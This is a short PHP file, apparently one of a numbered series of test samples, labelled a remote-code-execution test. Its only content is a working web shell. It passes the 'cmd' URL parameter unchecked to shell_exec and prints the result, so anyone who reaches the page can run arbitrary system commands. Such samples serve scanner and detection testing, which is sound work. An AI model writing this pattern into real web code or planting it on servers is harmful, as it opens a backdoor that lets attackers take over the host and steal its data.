<?php
// RCE test variation #1252
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>